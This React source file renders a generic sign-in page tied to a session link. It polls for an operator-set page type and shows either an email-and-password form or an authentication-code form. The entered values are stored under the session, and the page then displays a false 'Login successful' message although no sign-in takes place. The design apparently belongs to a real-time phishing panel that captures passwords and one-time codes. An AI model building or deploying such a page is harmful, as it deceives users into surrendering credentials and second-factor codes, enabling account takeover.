
import React, { useState, useEffect } from 'react';
import { useParams, Navigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { useSessionContext, PageType } from '@/contexts/SessionContext';
import { Loader2 } from 'lucide-react';

const Login1Form = ({ onSubmit, isSubmitting }: { onSubmit: (email: string, password: string) => void, isSubmitting: boolean }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  return (
    <form onSubmit={(e) => {
      e.preventDefault();
      onSubmit(email, password);
    }}>
      <div className="grid gap-4">
        <div className="grid gap-2">
          <Label htmlFor="email">Email</Label>
          <Input
            id="email"
            type="email"
            placeholder="name@example.com"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
        </div>
        <div className="grid gap-2">
          <Label htmlFor="password">Password</Label>
          <Input
            id="password"
            type="password"
            placeholder="••••••••"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>
        <Button type="submit" className="w-full" disabled={isSubmitting}>
          {isSubmitting ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Please wait
            </>
          ) : (
            "Sign In"
          )}
        </Button>
      </div>
    </form>
  );
};

const Login2Form = ({ onSubmit, isSubmitting }: { onSubmit: (authCode: string) => void, isSubmitting: boolean }) => {
  const [authCode, setAuthCode] = useState('');

  return (
    <form onSubmit={(e) => {
      e.preventDefault();
      onSubmit(authCode);
    }}>
      <div className="grid gap-4">
        <div className="grid gap-2">
          <Label htmlFor="authCode">Authentication Code</Label>
          <Input
            id="authCode"
            type="text"
            placeholder="Enter your auth code"
            required
            value={authCode}
            onChange={(e) => setAuthCode(e.target.value)}
          />
        </div>
        <Button type="submit" className="w-full" disabled={isSubmitting}>
          {isSubmitting ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Verifying
            </>
          ) : (
            "Verify Code"
          )}
        </Button>
      </div>
    </form>
  );
};

const LoginPage = () => {
  const { sessionId } = useParams<{ sessionId: string }>();
  const { getSession, addSessionData } = useSessionContext();
  const [pageType, setPageType] = useState<PageType | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [pollingId, setPollingId] = useState<number | null>(null);

  useEffect(() => {
    if (!sessionId) return;

    // Function to check for session updates
    const checkSession = () => {
      const session = getSession(sessionId);
      
      if (session) {
        setPageType(session.pageType);
        setIsLoading(false);
      } else {
        setIsLoading(false);
      }
    };

    // Check immediately
    checkSession();

    // Start polling for updates
    const id = window.setInterval(checkSession, 1500);
    setPollingId(id);

    return () => {
      if (pollingId) window.clearInterval(pollingId);
    };
  }, [sessionId, getSession]);

  // Clean up on unmount
  useEffect(() => {
    return () => {
      if (pollingId) window.clearInterval(pollingId);
    };
  }, [pollingId]);

  const handleLogin1Submit = (email: string, password: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    
    // Simulate a delay to show loading state
    setTimeout(() => {
      addSessionData(sessionId, { email, password });
      setIsSubmitting(false);
      setIsSuccess(true);
      
      // Reset success message after a delay
      setTimeout(() => {
        setIsSuccess(false);
      }, 3000);
    }, 1500);
  };

  const handleLogin2Submit = (authCode: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    
    // Simulate a delay to show loading state
    setTimeout(() => {
      addSessionData(sessionId, { authCode });
      setIsSubmitting(false);
      setIsSuccess(true);
      
      // Reset success message after a delay
      setTimeout(() => {
        setIsSuccess(false);
      }, 3000);
    }, 1500);
  };

  if (!sessionId) {
    return <Navigate to="/" />;
  }

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <Loader2 className="h-12 w-12 animate-spin mx-auto text-brand-purple" />
          <h2 className="mt-4 text-lg font-medium">Loading session...</h2>
        </div>
      </div>
    );
  }

  if (pageType === null) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="bg-white p-8 rounded-lg shadow-md text-center max-w-md w-full">
          <h2 className="text-2xl font-bold text-red-500 mb-2">Session Not Found</h2>
          <p className="text-gray-600 mb-6">The session you're looking for doesn't exist or has expired.</p>
          <Button asChild>
            <a href="/">Return to Dashboard</a>
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <Card className="w-full max-w-md mx-auto">
        <CardHeader className="text-center">
          <CardTitle className="text-2xl font-bold">
            {pageType === 'login1' ? 'Sign In to Your Account' : 'Verify Your Identity'}
          </CardTitle>
          <CardDescription>
            {pageType === 'login1' 
              ? 'Enter your email and password to continue'
              : 'Enter your authentication code to continue'}
          </CardDescription>
        </CardHeader>
        <CardContent>
          {isSuccess && (
            <Alert className="mb-4 bg-green-50 border-green-600">
              <AlertDescription className="text-green-700">
                {pageType === 'login1' 
                  ? 'Login successful! Redirecting...'
                  : 'Authentication successful! Redirecting...'}
              </AlertDescription>
            </Alert>
          )}

          {pageType === 'login1' ? (
            <Login1Form onSubmit={handleLogin1Submit} isSubmitting={isSubmitting} />
          ) : (
            <Login2Form onSubmit={handleLogin2Submit} isSubmitting={isSubmitting} />
          )}
        </CardContent>
        <CardFooter className="flex justify-center text-xs text-muted-foreground">
          Protected by Session Link Generator
        </CardFooter>
      </Card>
    </div>
  );
};

export default LoginPage;
